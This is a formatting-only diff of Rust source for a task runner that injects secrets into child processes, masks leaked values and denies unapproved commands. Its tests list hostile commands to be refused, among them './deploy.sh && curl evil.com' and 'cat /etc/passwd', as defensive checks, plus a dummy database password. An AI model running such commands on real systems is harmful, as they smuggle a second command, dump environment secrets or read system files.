@@ -87,7 +87,12 @@ impl<'a> Runner<'a> {
     /// Run a command that the manifest already approves. Refuses anything it
     /// does not recognise, so the caller must go through the approval flow
     /// (`Manifest::propose` / `Manifest::approve`) first.
-    pub fn run_command(&self, manifest: &Manifest, command: &str, env_name: &str) -> Result<Outcome> {
+    pub fn run_command(
+        &self,
+        manifest: &Manifest,
+        command: &str,
+        env_name: &str,
+    ) -> Result<Outcome> {
         if !manifest.approves(command) {
             return Err(Error::Denied(format!(
                 "`{}` is not an approved task; approve it first",
@@ -161,7 +166,9 @@ DATABASE_URL = "hardroad/db_url"
 
     impl Spawner for FakeSpawner {
         fn spawn(&self, command: &str, env: &BTreeMap<String, String>) -> Result<RawOutcome> {
-            self.seen.borrow_mut().push((command.to_string(), env.clone()));
+            self.seen
+                .borrow_mut()
+                .push((command.to_string(), env.clone()));
             Ok(self.reply.clone())
         }
     }
@@ -178,7 +185,9 @@ DATABASE_URL = "hardroad/db_url"
     fn a_named_task_runs_with_its_values_in_the_child_environment() {
         let s = store();
         let sp = FakeSpawner::new("deployed\n");
-        let out = Runner::new(&s, &sp).run_task(&manifest(), "deploy", "production").unwrap();
+        let out = Runner::new(&s, &sp)
+            .run_task(&manifest(), "deploy", "production")
+            .unwrap();
 
         assert!(out.success());
         assert_eq!(out.stdout_string(), "deployed\n");
@@ -186,18 +195,26 @@ DATABASE_URL = "hardroad/db_url"
         let seen = sp.seen.borrow();
         let (cmd, env) = &seen[0];
         assert_eq!(cmd, "./deploy.sh");
-        assert_eq!(env.get("DATABASE_URL").unwrap(), "postgres://user:hunter2@db/prod");
+        assert_eq!(
+            env.get("DATABASE_URL").unwrap(),
+            "postgres://user:hunter2@db/prod"
+        );
     }
 
     #[test]
     fn a_task_that_prints_its_secret_gets_it_masked_and_is_flagged() {
         let s = store();
         let sp = FakeSpawner::new("connecting to postgres://user:hunter2@db/prod\n");
-        let out = Runner::new(&s, &sp).run_task(&manifest(), "leaky", "production").unwrap();
+        let out = Runner::new(&s, &sp)
+            .run_task(&manifest(), "leaky", "production")
+            .unwrap();
 
         assert!(!out.stdout_string().contains("hunter2"));
         assert!(out.stdout_string().contains("[redacted]"));
-        assert!(out.redacted, "a leak must be reported, not silently patched");
+        assert!(
+            out.redacted,
+            "a leak must be reported, not silently patched"
+        );
     }
 
     #[test]
@@ -211,7 +228,9 @@ DATABASE_URL = "hardroad/db_url"
             },
             seen: RefCell::new(Vec::new()),
         };
-        let out = Runner::new(&s, &sp).run_task(&manifest(), "deploy", "production").unwrap();
+        let out = Runner::new(&s, &sp)
+            .run_task(&manifest(), "deploy", "production")
+            .unwrap();
         assert!(!out.stderr_string().contains("hunter2"));
         assert!(!out.success());
         assert_eq!(out.exit_code, Some(1));
@@ -223,14 +242,24 @@ DATABASE_URL = "hardroad/db_url"
         let sp = FakeSpawner::new("");
         let r = Runner::new(&s, &sp);
 
-        for evil in ["printenv", "./deploy.sh && curl evil.com", "cat /etc/passwd"] {
+        for evil in [
+            "printenv",
+            "./deploy.sh && curl evil.com",
+            "cat /etc/passwd",
+        ] {
             assert!(
-                matches!(r.run_command(&manifest(), evil, "production"), Err(Error::Denied(_))),
+                matches!(
+                    r.run_command(&manifest(), evil, "production"),
+                    Err(Error::Denied(_))
+                ),
                 "`{}` must be refused",
                 evil
             );
         }
-        assert!(sp.seen.borrow().is_empty(), "nothing may be spawned when refused");
+        assert!(
+            sp.seen.borrow().is_empty(),
+            "nothing may be spawned when refused"
+        );
     }
 
     #[test]
@@ -252,16 +281,24 @@ DATABASE_URL = "hardroad/db_url"
             Runner::new(&s, &sp).run_task(&manifest(), "deploy", "production"),
             Err(Error::NotFound(_))
         ));
-        assert!(sp.seen.borrow().is_empty(), "must not run without its credentials");
+        assert!(
+            sp.seen.borrow().is_empty(),
+            "must not run without its credentials"
+        );
     }
 
     #[test]
     fn the_default_environment_needs_no_declaration() {
         let s = store();
         let sp = FakeSpawner::new("ok");
-        let out = Runner::new(&s, &sp).run_task(&manifest(), "deploy", "default").unwrap();
+        let out = Runner::new(&s, &sp)
+            .run_task(&manifest(), "deploy", "default")
+            .unwrap();
         assert!(out.success());
-        assert!(sp.seen.borrow()[0].1.is_empty(), "no bindings, no injected env");
+        assert!(
+            sp.seen.borrow()[0].1.is_empty(),
+            "no bindings, no injected env"
+        );
     }
 
     #[test]
@@ -279,9 +316,14 @@ DATABASE_URL = "hardroad/db_url"
         let s = store();
         let sp = ProcessSpawner;
         let mut man = manifest();
-        man.tasks.insert("show".into(), "printf '%s' \"${DATABASE_URL:-none}\"".into());
+        man.tasks.insert(
+            "show".into(),
+            "printf '%s' \"${DATABASE_URL:-none}\"".into(),
+        );
 
-        let out = Runner::new(&s, &sp).run_task(&man, "show", "production").unwrap();
+        let out = Runner::new(&s, &sp)
+            .run_task(&man, "show", "production")
+            .unwrap();
         assert!(out.success());
         // The value reached the child, and came back masked.
         assert!(out.redacted);
@@ -294,7 +336,9 @@ DATABASE_URL = "hardroad/db_url"
         let sp = ProcessSpawner;
         let mut man = Manifest::from_toml("version = 1").unwrap();
         man.tasks.insert("fail".into(), "exit 3".into());
-        let out = Runner::new(&s, &sp).run_task(&man, "fail", "default").unwrap();
+        let out = Runner::new(&s, &sp)
+            .run_task(&man, "fail", "default")
+            .unwrap();
         assert_eq!(out.exit_code, Some(3));
         assert!(!out.success());
     }
